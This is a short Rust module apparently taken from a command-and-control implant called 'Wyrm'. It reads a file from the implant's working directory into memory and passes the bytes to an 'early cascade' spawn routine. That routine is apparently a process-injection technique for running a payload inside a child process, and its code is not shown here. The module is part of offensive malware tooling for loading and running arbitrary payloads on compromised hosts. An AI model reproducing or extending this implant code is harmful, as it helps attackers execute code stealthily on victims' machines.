use std::{
    fs::{self},
    path::PathBuf,
};

use shared::tasks::WyrmResult;

use crate::{
    native::filesystem::{PathParseType, parse_path},
    spawn::early_cascade::early_cascade_spawn_child,
};

pub mod early_cascade;

pub enum SpawnMethod {
    EarlyCascade,
}

pub struct Spawn;

impl Spawn {
    pub fn spawn_child(
        path: &str,
        implant_working_dir: &PathBuf,
        method: SpawnMethod,
    ) -> WyrmResult<String> {
        let path = match parse_path(path, implant_working_dir, PathParseType::File) {
            WyrmResult::Ok(p) => p,
            WyrmResult::Err(e) => {
                #[cfg(debug_assertions)]
                println!("Failed to parse path {path}. {e}");

                return WyrmResult::Err(e);
            }
        };

        let Ok(buf) = fs::read(path) else {
            return WyrmResult::Err(format!("Could not read file"));
        };

        match method {
            SpawnMethod::EarlyCascade => early_cascade_spawn_child(buf),
        }
    }
}
